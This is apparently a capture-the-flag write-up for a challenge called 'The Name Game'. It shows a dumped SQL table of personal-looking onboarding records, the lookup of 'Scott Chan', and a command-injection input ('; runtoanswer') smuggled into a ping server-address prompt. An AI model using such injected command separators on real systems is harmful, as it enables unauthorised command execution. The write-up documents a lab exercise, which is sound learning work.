INSERT INTO "onboard" VALUES(28,'Blanche','Webster','2695 Airport Blvd',NULL,'Gander','A1V 2M7','709-234-5453','blancherwebster@dayrep.com');
INSERT INTO "onboard" VALUES(29,'Antonio','Herbert','637 Lynden Road',NULL,'Lefroy','L0L 1W0','705-456-6107','antoniogherbert@einrot.com');
INSERT INTO "onboard" VALUES(30,'Elisabeth','George','4667 Harley Brook Lane',NULL,'Johnstown','15904','814-592-3905','elisabethmgeorge@teleworm.us');
INSERT INTO "onboard" VALUES(31,'Mark','Dinkins','3593 Private Lane',NULL,'Albany','31701','229-281-7470','markndinkins@einrot.com');
INSERT INTO "onboard" VALUES(32,'Melody','Mendoza','2900 Reserve St',NULL,'Castleton','K0K 1M0','905-344-8354','melodywmendoza@gustr.com');
INSERT INTO "onboard" VALUES(33,'Reginald','Duncan','3606 Michigan Avenue',NULL,'Bolivar','15923','724-676-9897','reginaldvduncan@jourrapide.com');
INSERT INTO "onboard" VALUES(34,'Jessica','Munk','51 Cunnery Rd',NULL,'MAESYCRUGIAU','SA39 8FJ','078 6965 8387','jessicaamunk@fleckens.hu');
INSERT INTO "onboard" VALUES(35,'Aaron','Pasley','41 Glenurquhart Road',NULL,'BALLIEMORE','PA34 5WH','077 6882 0012','aaronrpasley@rhyta.com');
INSERT INTO "onboard" VALUES(36,'Randy','Johnson','1545 Woodvale Drive',NULL,'Fingal','N0L 1K0','519-769-3889','randydjohnson@fleckens.hu');
INSERT INTO "onboard" VALUES(37,'Mary','Tucker','1306 Winding Way',NULL,'Providence','2906','401-692-8503','marybtucker@jourrapide.com');
INSERT INTO "onboard" VALUES(38,'Timothy','Montgomery','83 Academy Street',NULL,'BETHEL','LL21 1HD','070 6084 3545','timothyrmontgomery@superrito.com');
INSERT INTO "onboard" VALUES(39,'Elizabeth','Fox','1044 Tanner Street',NULL,'Vancouver','V5R 2T4','604-436-2749','elizabethmfox@jourrapide.com');
INSERT INTO "onboard" VALUES(40,'Clifford','Moore','41 Telford Street',NULL,'BARKHAM','RG41 9TQ','079 5681 0730','cliffordlmoore@fleckens.hu');
INSERT INTO "onboard" VALUES(41,'Clifford','Williams','24 Tonbridge Rd',NULL,'COOKNEY','AB3 5DY','078 6260 1601','cliffordcwilliams@dayrep.com');
INSERT INTO "onboard" VALUES(42,'Diane','Stewart','3825 Tully Street',NULL,'Livonia','48150','313-721-7835','dianewstewart@gustr.com');
INSERT INTO "onboard" VALUES(43,'Jane','Purdue','4522 Maple Court',NULL,'Macks Creek','65786','573-363-6930','janejpurdue@armyspy.com');
INSERT INTO "onboard" VALUES(44,'Donna','Reynolds','15 Folkestone Road',NULL,'WINCHMORE HILL','HP7 6UG','077 3596 0968','donnajreynolds@teleworm.us');
INSERT INTO "onboard" VALUES(45,'Mae','Gonzalez','4982 Yonge Street',NULL,'Toronto','M4W 1J7','416-318-6431','maedgonzalez@rhyta.com');
INSERT INTO "onboard" VALUES(46,'Julia','Mullenix','98 Graham Road',NULL,'CHEVITHORNE','EX16 9WE','079 4511 1929','juliapmullenix@armyspy.com');
INSERT INTO "onboard" VALUES(47,'Kathleen','Hudson','2102 rue Saint-Édouard',NULL,'Trois Rivieres','G9A 5S8','819-694-7235','kathleenshudson@dayrep.com');
INSERT INTO "onboard" VALUES(48,'Jose','Salas','801 Paradise Crescent',NULL,'Hauterive','G5C 1M1','418-589-3293','joseasalas@armyspy.com');
INSERT INTO "onboard" VALUES(49,'Suzanne','Ziegler','90 East Street',NULL,'MARK','TA9 7JE','078 2398 8807','suzannejziegler@fleckens.hu');
INSERT INTO "onboard" VALUES(50,'Stella','Worsham','910 Hart Country Lane',NULL,'Atlanta','30303','706-530-2741','stellasworsham@fleckens.hu');
INSERT INTO "onboard" VALUES(51,'Donald','Dupree','85 Glenurquhart Road',NULL,'BALLAUGH','IM7 9LT','070 2322 3531','donaldvdupree@teleworm.us');
INSERT INTO "onboard" VALUES(52,'Dolores','Carroll','81 Guildford Rd',NULL,'EAST HYDE','LU1 8ZF','070 5400 2455','dolorespcarroll@teleworm.us');
INSERT INTO "onboard" VALUES(53,'Danny','Pink','3962 Walnut Drive',NULL,'Fargo','58103','701-371-7143','dannycpink@fleckens.hu');
INSERT INTO "onboard" VALUES(54,'Dorothy','Rowe','4402 St Marys Rd',NULL,'Winnipeg','R3C 3N9','204-951-1482','dorothydrowe@rhyta.com');
INSERT INTO "onboard" VALUES(55,'Verna','Mashburn','4870 Trymore Road',NULL,'Clements','56224','507-692-6468','vernafmashburn@fleckens.hu');
INSERT INTO "onboard" VALUES(56,'Patsy','Mendez','629 Deer Ridge Drive',NULL,'Wayne','7477','973-641-9131','patsyamendez@cuvox.de');
INSERT INTO "onboard" VALUES(57,'Stan','Neel','4327 Embro St',NULL,'Innerkip','N0J 1M0','519-469-7243','stanjneel@gustr.com');
INSERT INTO "onboard" VALUES(58,'Scott','Casperson','402 Echo Lane',NULL,'Middleville','49333','269-795-1629','scottfcasperson@cuvox.de');
INSERT INTO "onboard" VALUES(59,'Roger','Waller','4974 Wiseman Street',NULL,'Jefferson City','37760','865-471-2287','rogertwaller@jourrapide.com');
INSERT INTO "onboard" VALUES(60,'Cary','Hurst','3567 Cooks Mine Road',NULL,'Las Cruces','88005','505-679-9488','caryghurst@jourrapide.com');
INSERT INTO "onboard" VALUES(61,'Tyler','Joseph','177 James Street',NULL,'Aldergrove','V5G 4S4','604-866-1097','tylersjoseph@rhyta.com');
INSERT INTO "onboard" VALUES(62,'Susie','Higa','80 Broad Street',NULL,'LOWER PENNINGTON','SO41 4BA','070 7312 1513','susiekhiga@dayrep.com');
INSERT INTO "onboard" VALUES(63,'Linda','Crawford','4060 Ross Street',NULL,'Smiths Falls','K7A 1C2','613-284-5165','lindakcrawford@jourrapide.com');
INSERT INTO "onboard" VALUES(64,'Katherine','Charney','622 137th Avenue',NULL,'Edmonton','T5J 0X2','780-669-4710','katherinefcharney@einrot.com');
INSERT INTO "onboard" VALUES(65,'Gretchen','Barthel','31 Kingsway North',NULL,'HOLSWORTHY','EX22 8EB','070 6551 4496','gretchencbarthel@gustr.com');
INSERT INTO "onboard" VALUES(66,'Marvin','Kennedy','34 Lamphey Road',NULL,'THE WYKE','TF11 1YR','078 6972 2991','marvinlkennedy@jourrapide.com');
INSERT INTO "onboard" VALUES(67,'Oretha','Wyss','4446 Davis Street',NULL,'Augusta','30901','706-365-8842','orethajwyss@fleckens.hu');
INSERT INTO "onboard" VALUES(68,'Brenda','Lowe','41 West Lane',NULL,'DALGONAR','DG3 8DP','070 5591 8305','brendaclowe@gustr.com');
INSERT INTO "onboard" VALUES(69,'Christina','Lewis','70 Thames Street',NULL,'BONNYBANK','KY8 1BG','070 1509 9499','christinaflewis@fleckens.hu');
INSERT INTO "onboard" VALUES(70,'Beatrice','Bullock','77 Abingdon Road',NULL,'BRANTWOOD','LA21 5PZ','079 6195 4027','beatricefbullock@superrito.com');
INSERT INTO "onboard" VALUES(71,'William','Higgins','65 Roman Rd',NULL,'LEDBURY','HR8 5JJ','079 2677 5229','williamchiggins@superrito.com');
INSERT INTO "onboard" VALUES(72,'Francis','Fails','1382 Papineau Avenue',NULL,'Montreal','H2K 4J5','514-402-7359','francispfails@armyspy.com');
INSERT INTO "onboard" VALUES(73,'Anthony','Gould','1689 Hammarskjold Dr',NULL,'Burnaby','V5B 3C9','604-293-7978','anthonyjgould@armyspy.com');
INSERT INTO "onboard" VALUES(74,'John','Gaston','2090 St Jean Baptiste St',NULL,'St Ludger','G0M 1W0','819-548-7107','johnegaston@gustr.com');
INSERT INTO "onboard" VALUES(75,'Judy','Franklin','15 Broomfield Place',NULL,'STONE STREET','IP19 3NA','078 6676 2490','judycfranklin@rhyta.com');
INSERT INTO "onboard" VALUES(76,'Vanessa','Hartsock','92 Middlewich Road',NULL,'FIVE ASH DOWN','TN22 0JT','077 2279 2150','vanessashartsock@einrot.com');
INSERT INTO "onboard" VALUES(77,'Lois','Martin','74 Consett Rd',NULL,'HIGHLAWS','CA5 6SD','077 2846 0658','loisjmartin@cuvox.de');
INSERT INTO "onboard" VALUES(78,'Charles','Mejia','64 Newgate Street',NULL,'JACKTON','G75 8QB','078 0038 5514','charlesbmejia@fleckens.hu');
INSERT INTO "onboard" VALUES(79,'Francisco','Guajardo','2074 Kerry Way',NULL,'Irvine','92614','562-832-4500','franciscolguajardo@dayrep.com');
INSERT INTO "onboard" VALUES(80,'Danny','Williams','4736 47th Avenue',NULL,'Boyle','T0A 0M0','780-689-7571','dannynwilliams@rhyta.com');
INSERT INTO "onboard" VALUES(81,'Juan','Bowen','1968 Danforth Avenue',NULL,'Toronto','M4K 1A6','416-476-9751','juanabowen@teleworm.us');
INSERT INTO "onboard" VALUES(82,'Jim','Hill','3518 Main St',NULL,'Wolfville','B0P 1X0','902-697-6163','jimchill@teleworm.us');
INSERT INTO "onboard" VALUES(83,'Joseph','Johnson','3443 Delaware Avenue',NULL,'San Francisco','94108','415-274-4354','josephjjohnson@cuvox.de');
INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
INSERT INTO "onboard" VALUES(85,'Pat','Shaffer','97 Southern Way',NULL,'NORTH SCARLE','LN6 7SE','070 5181 8156','patcshaffer@superrito.com');
INSERT INTO "onboard" VALUES(86,'John','Bishop','59 North Road',NULL,'NETHER HEYFORD','NN7 3TE','077 7175 9692','johnebishop@jourrapide.com');
INSERT INTO "onboard" VALUES(87,'Mattie','Rodriguez','2993 Yonge Street',NULL,'Toronto','M4W 1J7','416-720-2724','mattierrodriguez@armyspy.com');
INSERT INTO "onboard" VALUES(88,'Pearl','McCord','11 Boughton Rd',NULL,'WICKHAM ST PAUL','CO9 0QG','078 3015 0064','pearldmccord@superrito.com');
INSERT INTO "onboard" VALUES(89,'Laurie','Ng','1652 Higginsville Road',NULL,'Windsor','B0N 2T0','902-472-1603','lauriejng@fleckens.hu');
INSERT INTO "onboard" VALUES(90,'Tanya','Thomason','2386 Center Street',NULL,'Eugene','97401','541-915-2732','tanyamthomason@cuvox.de');
INSERT INTO "onboard" VALUES(91,'Sherry','Hinton','87 Southend Avenue',NULL,'BLACKFORDBY','DE11 5QN','070 8154 8258','sherrythinton@gustr.com');
INSERT INTO "onboard" VALUES(92,'Dwayne','Straight','3870 Ottis Street',NULL,'Minco','73059','405-352-0132','dwaynejstraight@gustr.com');
INSERT INTO "onboard" VALUES(93,'Tina','Houser','4195 Quayside Dr',NULL,'New Westminster','V3M 6A1','778-238-8700','tinaahouser@teleworm.us');
INSERT INTO "onboard" VALUES(94,'Deborah','Soileau','3938 Goyeau Ave',NULL,'Windsor','N9A 1H9','519-890-6446','deborahjsoileau@teleworm.us');
INSERT INTO "onboard" VALUES(95,'Sharon','Leitch','4608 Snowbird Lane',NULL,'Omaha','68104','402-689-8335','sharonjleitch@superrito.com');
INSERT INTO "onboard" VALUES(96,'Julia','Nunn','3166 rue des Églises Est',NULL,'Arntfield','J0Z 1B0','819-279-8802','julialnunn@fleckens.hu');
INSERT INTO "onboard" VALUES(97,'Emma','Anton','950 Carling Avenue',NULL,'Ottawa','K1Z 7B5','613-799-8843','emmawanton@einrot.com');
INSERT INTO "onboard" VALUES(98,'Margaret','Janes','1476 Boone Street',NULL,'Alice','78332','361-207-8407','margaretcjanes@fleckens.hu');
INSERT INTO "onboard" VALUES(99,'Terry','Morgan','441 Fallon Drive',NULL,'Mount Forest','N0G 2L2','519-321-3224','terryjmorgan@fleckens.hu');
INSERT INTO "onboard" VALUES(100,'Adam','Cooper','4791 Waterton Avenue',NULL,'Pincher Creek','T0K 1W0','403-632-1856','adamhcooper@superrito.com');
INSERT INTO "onboard" VALUES(101,'Diane','McCartney','845 Lauzon Parkway',NULL,'Leamington','N8H 3B1','519-322-3658','dianekmccartney@cuvox.de');
INSERT INTO "onboard" VALUES(102,'Thomas','Buss','57 Canterbury Road',NULL,'UPWARE','CB7 3NH','078 7137 8440','thomaspbuss@cuvox.de');
INSERT INTO "onboard" VALUES(103,'Amanda','Johnson','40 Whatlington Road',NULL,'COULSTON','BA13 9BA','070 2755 4430','amandacjohnson@gustr.com');
INSERT INTO "onboard" VALUES(104,'Stella','Jones','90 Maidstone Road',NULL,'WENTNOR','SY9 1NN','078 6029 1533','stellajjones@gustr.com');
INSERT INTO "onboard" VALUES(105,'Angela','Linder','83 Roman Rd',NULL,'LEE MILL BRIDGE','PL7 5NW','079 3061 8143','angelaelinder@teleworm.us');
INSERT INTO "onboard" VALUES(106,'Lance','Schill','1488 Oakway Lane',NULL,'Los Angeles','90017','818-253-8238','lancesschill@jourrapide.com');
INSERT INTO "onboard" VALUES(107,'Mary','Smith','42 Fulford Road',NULL,'PENPONT','DG3 2SN','078 4426 8667','maryjsmith@rhyta.com');
INSERT INTO "onboard" VALUES(108,'Joseph','Beck','20 Seaford Road',NULL,'CULLIPOOL','PA34 8BP','078 4405 7430','josephsbeck@gustr.com');
INSERT INTO "onboard" VALUES(109,'Edward','Dawkins','1259 Selah Way',NULL,'Winooski','5404','802-654-3001','edwardhdawkins@superrito.com');
INSERT INTO "onboard" VALUES(110,'Kevin','Torres','714 Myra Street',NULL,'Providence','2903','401-488-9912','kevindtorres@superrito.com');
INSERT INTO "onboard" VALUES(111,'Cameron','Wells','4822 Rhapsody Street',NULL,'Gainesville','32601','352-337-5273','cameronrwells@armyspy.com');
INSERT INTO "onboard" VALUES(112,'Louis','Garcia','4217 Burwell Heights Road',NULL,'Houston','77027','409-555-7232','louisvgarcia@armyspy.com');
INSERT INTO "onboard" VALUES(113,'Stacey','White','82 Well Lane',NULL,'PATRIXBOURNE','CT4 6SZ','079 7426 2830','staceywwhite@teleworm.us');
INSERT INTO "onboard" VALUES(114,'Jean','Cruise','798 40th Street',NULL,'Calgary','T2K 0P7','403-275-7274','jeanbcruise@armyspy.com');
INSERT INTO "onboard" VALUES(115,'Omega','Stamm','15 Whatlington Road',NULL,'COWAN BRIDGE','LA6 9WU','077 5586 6506','omegafstamm@jourrapide.com');
INSERT INTO "onboard" VALUES(116,'Claudia','Cantrell','24 Trehafod Road',NULL,'BUCKLEBURY','RG7 2TS','078 5083 3233','claudiatcantrell@jourrapide.com');
INSERT INTO "onboard" VALUES(117,'Joann','Kellar','80 Petworth Rd',NULL,'DUNSTON','ST18 9BR','079 7011 8965','joannskellar@cuvox.de');
INSERT INTO "onboard" VALUES(118,'Dexter','Figueroa','2294 Broadmoor Blvd',NULL,'Sherwood Park','T8A 1V6','780-662-7299','dexterbfigueroa@cuvox.de');
INSERT INTO "onboard" VALUES(119,'Debbie','Gee','49 Sandyhill Rd',NULL,'GAICK LODGE','PH21 7WE','070 8515 8276','debbiergee@armyspy.com');
INSERT INTO "onboard" VALUES(120,'Lilian','Finn','1836 Reserve St',NULL,'Long Sault','K0L 1P0','613-534-6303','liliankfinn@einrot.com');
INSERT INTO "onboard" VALUES(121,'Estelle','Avila','45 Ash Lane',NULL,'YIEWSLEY','UB7 5YQ','078 6560 6052','estelleravila@jourrapide.com');
INSERT INTO "onboard" VALUES(122,'John','Gill','2268 Red Bud Lane',NULL,'Rochelle Park','7662','862-370-8712','johnagill@gustr.com');
INSERT INTO "onboard" VALUES(123,'Lisa','Arsenault','92 West Lane',NULL,'DARENTH','DA2 1ZJ','078 7094 2406','lisajarsenault@gustr.com');
INSERT INTO "onboard" VALUES(124,'John','Garcia','56 Golden Knowes Road',NULL,'FRIESTHORPE','LN3 0HE','070 1447 9983','johnsgarcia@cuvox.de');
INSERT INTO "onboard" VALUES(125,'Melvin','Carlucci','2232 Yonge Street',NULL,'Toronto','M4W 1J7','416-961-5670','melvinlcarlucci@cuvox.de');
INSERT INTO "onboard" VALUES(126,'Stefan','Sanchez','36 Trehafod Road',NULL,'BUCKLAND BREWER','EX39 8YL','077 3783 9813','stefanksanchez@rhyta.com');
INSERT INTO "onboard" VALUES(127,'Sylvia','Shaver','1317 47th Avenue',NULL,'Lac La Biche','T0A 2C0','780-404-8373','sylviaoshaver@dayrep.com');
INSERT INTO "onboard" VALUES(128,'Ka','Venne','4953 Doctors Drive',NULL,'El Segundo','90245','310-364-8308','kagvenne@cuvox.de');
INSERT INTO "onboard" VALUES(129,'Ofelia','Graham','88 Broomfield Place',NULL,'STONEBRIDGE','CV7 9JE','070 4014 2835','ofeliahgraham@teleworm.us');
INSERT INTO "onboard" VALUES(130,'Teresa','Clayton','2121 Elk Rd Little',NULL,'Tucson','85712','520-237-6700','teresajclayton@teleworm.us');
INSERT INTO "onboard" VALUES(131,'Ronald','Killion','663 40th Street',NULL,'Calgary','T2P 2V7','403-539-0482','ronaldbkillion@cuvox.de');
INSERT INTO "onboard" VALUES(132,'Diane','Moore','346 Dundas St',NULL,'Toronto','M2N 2G8','416-218-0180','dianebmoore@dayrep.com');
INSERT INTO "onboard" VALUES(133,'Eva','Dahlstrom','92 47th Avenue',NULL,'Waskatenau','T0A 3P0','780-358-8646','evacdahlstrom@superrito.com');
INSERT INTO "onboard" VALUES(134,'Marie','Davis','86 Sea Road',NULL,'LAMLOCH','DG7 9GF','077 6603 5676','mariemdavis@cuvox.de');
INSERT INTO "onboard" VALUES(135,'Linda','Broomfield','4780 Woodstock Drive',NULL,'El Monte','91731','626-456-3955','lindambroomfield@dayrep.com');
INSERT INTO "onboard" VALUES(136,'Daniel','Reed','84 Buckingham Rd',NULL,'THORNTON-LE-BEANS','DL6 8HP','079 7101 0192','danieldreed@rhyta.com');
INSERT INTO "onboard" VALUES(137,'Douglas','Porter','17 Scarcroft Road',NULL,'PORTH','CF39 9EU','079 5441 7939','douglasfporter@jourrapide.com');
INSERT INTO "onboard" VALUES(138,'Lawrence','Heck','4919 Speers Road',NULL,'Brampton','L6T 3W9','905-793-4570','lawrencerheck@fleckens.hu');
INSERT INTO "onboard" VALUES(139,'Rachel','Trent','4653 Haaglund Rd',NULL,'Lower Post','V0H 0H0','250-779-0723','racheljtrent@teleworm.us');
INSERT INTO "onboard" VALUES(140,'Iva','Johnson','2939 Quilly Lane',NULL,'Westerville','43081','614-544-2873','ivadjohnson@jourrapide.com');
INSERT INTO "onboard" VALUES(141,'Lance','Arceo','86 Kingsway North',NULL,'HOLMSIDE','DH7 9EW','070 5772 3162','lancemarceo@cuvox.de');
INSERT INTO "onboard" VALUES(142,'Valerie','Howell','1142 rue Levy',NULL,'Montreal','H3C 5K4','514-774-5866','valeriedhowell@superrito.com');
INSERT INTO "onboard" VALUES(143,'Mary','Poirier','2038 Stutler Lane',NULL,'Bedford','15522','814-423-2173','marydpoirier@einrot.com');
INSERT INTO "onboard" VALUES(144,'Susanne','Camp','4146 Galts Ave',NULL,'Red Deer','T4N 5Z9','403-373-2195','susannewcamp@armyspy.com');
INSERT INTO "onboard" VALUES(145,'Ron','Peters','1364 137th Avenue',NULL,'Edmonton','T5M 3K3','780-454-1668','ronlpeters@rhyta.com');
INSERT INTO "onboard" VALUES(146,'Marjory','Bryant','4129 Court Street',NULL,'Eureka','63025','636-587-5083','marjorykbryant@dayrep.com');
INSERT INTO "onboard" VALUES(147,'Betty','Pratt','68 Oxford Rd',NULL,'WOOTTON','CT4 5WA','070 4977 6152','bettygpratt@gustr.com');
INSERT INTO "onboard" VALUES(148,'Regina','Chen','3930 Chestnut Street',NULL,'Tampa','33619','727-482-0568','reginalchen@cuvox.de');
INSERT INTO "onboard" VALUES(149,'Charles','Atkins','418 Hood Avenue',NULL,'San Diego','92111','858-694-9634','charlesmatkins@gustr.com');
INSERT INTO "onboard" VALUES(150,'Lawrence','Taylor','91 Scarcroft Road',NULL,'PORT LOGAN','DG9 5LG','077 3050 1172','lawrencejtaylor@cuvox.de');
INSERT INTO "onboard" VALUES(151,'Pam','Goudy','1785 Russell Street',NULL,'Woburn','1801','978-853-5666','pamgoudy@einrot.com');
INSERT INTO "onboard" VALUES(152,'Evelyn','Evans','2438 Reserve St',NULL,'Parham','K0H 2K0','613-375-6041','evelyndevans@cuvox.de');
INSERT INTO "onboard" VALUES(153,'Janice','Atkin','85 Oxford Rd',NULL,'WORK','KW15 5EF','078 8718 3013','janicebatkin@dayrep.com');
INSERT INTO "onboard" VALUES(154,'Hazel','Merrick','3751 Owen Lane',NULL,'Naples','33940','239-263-5968','hazelbmerrick@cuvox.de');
INSERT INTO "onboard" VALUES(155,'Pearlene','Ferrell','1410 Dominion St',NULL,'Finch','K0C 1K0','613-984-2873','pearlenetferrell@teleworm.us');
INSERT INTO "onboard" VALUES(156,'Peggy','Harper','1846 Davis Street',NULL,'Chickamauga','30707','706-382-7319','peggyaharper@armyspy.com');
INSERT INTO "onboard" VALUES(157,'Carol','Lindsey','4211 40th Street',NULL,'Calgary','T2M 0X4','403-210-8234','carolglindsey@gustr.com');
INSERT INTO "onboard" VALUES(158,'Santiago','Field','4783 Merivale Road',NULL,'Kanata','K2K 1L9','613-592-3285','santiagobfield@einrot.com');
INSERT INTO "onboard" VALUES(159,'Hugh','Torres','3773 Northumberland Street',NULL,'Baden','N0B 1G0','519-634-7229','hughbtorres@teleworm.us');
INSERT INTO "onboard" VALUES(160,'Claudia','Halpin','3248 Colonial Drive',NULL,'College Station','77840','979-764-7262','claudiajhalpin@armyspy.com');
INSERT INTO "onboard" VALUES(161,'Christopher','Windham','2310 Barton Street',NULL,'Stoney Creek','L8G 2V1','905-664-5559','christopheruwindham@fleckens.hu');
INSERT INTO "onboard" VALUES(162,'Theodore','Young','4201 Providence Lane',NULL,'Anaheim','92801','626-803-1180','theodoresyoung@cuvox.de');
INSERT INTO "onboard" VALUES(163,'Lauren','Casey','4455 Fallon Drive',NULL,'Hensall','N0M 1X0','519-263-7462','laurenjcasey@jourrapide.com');
INSERT INTO "onboard" VALUES(164,'Molly','Logan','1544 St George Street',NULL,'Vancouver','V5T 1Z7','604-871-8098','mollyhlogan@jourrapide.com');
INSERT INTO "onboard" VALUES(165,'Alan','Guinn','3395 Galts Ave',NULL,'Red Deer','T4N 2A6','403-309-5523','alanmguinn@fleckens.hu');
INSERT INTO "onboard" VALUES(166,'Brenda','Johnson','65 Northgate Street',NULL,'BETLEY','CW3 1TE','070 1362 3463','brendatjohnson@gustr.com');
INSERT INTO "onboard" VALUES(167,'Catherine','Priest','1144 McDonald Avenue',NULL,'Orlando','32810','407-924-7464','catherinebpriest@superrito.com');
INSERT INTO "onboard" VALUES(168,'William','McCoy','1019 Benson Park Drive',NULL,'Newcastle','73065','405-387-6925','williammmccoy@superrito.com');
INSERT INTO "onboard" VALUES(169,'Stephanie','Jaynes','1854 Tycos Dr',NULL,'Toronto','M5T 1T4','416-605-0198','stephaniejjaynes@rhyta.com');
COMMIT;</pre>
        <p>When we first logged into <b>The Name Game</b> the rhyme at the beginning asks us to look for <b>"Chan!"</b>. That could only be one line from above</p>
        <pre class="border text-light bg-dark p-2">INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');</pre>
        <p>That gives us the firstname of <b>Scott</b> as our answer. Since we can now run commands, we can also perform the completion of the challenge which is to execute <code>runtoanswer</code>. which we do by crafting the the following input for option <kbd>2</kbd>:</p>
        <pre class="border text-light bg-dark p-2">; runtoanswer</pre>
        <pre class="text-monospace bg-dark text-light p-2">
Validating data store for employee onboard information.

Enter address of server: ; runtoanswer

Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Loading, please wait......



Enter Mr. Chan's first name: Scott


<span style="color: rgb(211, 215, 207);">        </span>                                                                <span style="color: rgb(211, 215, 207);">        </span>
<span style="color: rgb(211, 215, 207);">   </span> <span style="color: rgb(78, 154, 6);">.;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'</span> <span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(78, 154, 6);">'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO</span><span style="color: rgb(211, 215, 207);">000</span><span style="color: rgb(78, 154, 6);">Okdooooooooooooo;</span> <span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(78, 154, 6);">'ooooooooooooo</span>X<span style="color: rgb(211, 215, 207);">M</span>W<span style="color: rgb(78, 154, 6);">ooooO</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xod</span>MMNKKKK<span style="color: rgb(78, 154, 6);">xoO</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xooooo</span>W<span style="color: rgb(211, 215, 207);">M</span>X<span style="color: rgb(78, 154, 6);">oooook</span>NMWK<span style="color: rgb(78, 154, 6);">0</span><span style="color: rgb(211, 215, 207);">K</span>NMW<span style="color: rgb(78, 154, 6);">Oooooooooooooo;</span><span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(78, 154, 6);">:ooooooooooooo</span>X<span style="color: rgb(211, 215, 207);">M</span>W<span style="color: rgb(78, 154, 6);">ooooO</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xod</span>MM<span style="color: rgb(78, 154, 6);">0ooooooO</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xooooo</span>W<span style="color: rgb(211, 215, 207);">M</span>X<span style="color: rgb(78, 154, 6);">oooox</span>MMK<span style="color: rgb(78, 154, 6);">ooooo</span>K<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">kooooooooooooo</span>
 <span style="color: rgb(78, 154, 6);">cooooooooooooo</span>X<span style="color: rgb(211, 215, 207);">M</span>MMMMMM<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xod</span>MMWWWW<span style="color: rgb(78, 154, 6);">0ooO</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xooooo</span>W<span style="color: rgb(211, 215, 207);">M</span>X<span style="color: rgb(78, 154, 6);">ooooO</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(78, 154, 6);">koooook</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(78, 154, 6);">0ooooooooooooo</span>
 <span style="color: rgb(78, 154, 6);">cooooooooooooo</span>X<span style="color: rgb(211, 215, 207);">M</span>W<span style="color: rgb(78, 154, 6);">dddd0</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xod</span>MM<span style="color: rgb(78, 154, 6);">0ddddooO</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xooooo</span>W<span style="color: rgb(211, 215, 207);">M</span>X<span style="color: rgb(78, 154, 6);">ooooO</span>MM<span style="color: rgb(78, 154, 6);">OoooooO</span>MM<span style="color: rgb(78, 154, 6);">kooooooooooooo</span>
 <span style="color: rgb(78, 154, 6);">cooooooooooooo</span>X<span style="color: rgb(211, 215, 207);">M</span>W<span style="color: rgb(78, 154, 6);">ooooO</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xod</span>MM<span style="color: rgb(78, 154, 6);">KxxxxdoO</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">Okkkxo</span>W<span style="color: rgb(211, 215, 207);">M</span>X<span style="color: rgb(78, 154, 6);">kkkkd</span>XMW<span style="color: rgb(78, 154, 6);">0xxk0</span>MMK<span style="color: rgb(78, 154, 6);">oooooooooooooo</span>
 <span style="color: rgb(78, 154, 6);">cooooooooooooo0</span>NX<span style="color: rgb(78, 154, 6);">ooook</span>NN<span style="color: rgb(78, 154, 6);">dod</span>XNNNNNN<span style="color: rgb(78, 154, 6);">kok</span>NNNNNN<span style="color: rgb(78, 154, 6);">Oo</span>KNNNNNX<span style="color: rgb(78, 154, 6);">ook</span>KNNWNX<span style="color: rgb(78, 154, 6);">Kxooooooooooooooo</span>
 <span style="color: rgb(78, 154, 6);">cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo</span>
 <span style="color: rgb(78, 154, 6);">coooooooooooooooooooooooooooooooooo</span>MY<span style="color: rgb(78, 154, 6);">c</span>NAME<span style="color: rgb(78, 154, 6);">c</span>IS<span style="color: rgb(78, 154, 6);">ooooooooooooooooooooooooooooooooo</span>
<span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(78, 154, 6);">cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo</span>
<span style="color: rgb(211, 215, 207);"> O</span>MMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMM<span style="color: rgb(211, 215, 207);">W </span>
<span style="color: rgb(211, 215, 207);"> OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:. </span> <span style="color: rgb(211, 215, 207);">.  .lWO         d         xMMMMMMMMMMMW </span>
<span style="color: rgb(211, 215, 207);"> OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW </span>
<span style="color: rgb(211, 215, 207);"> OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW </span>
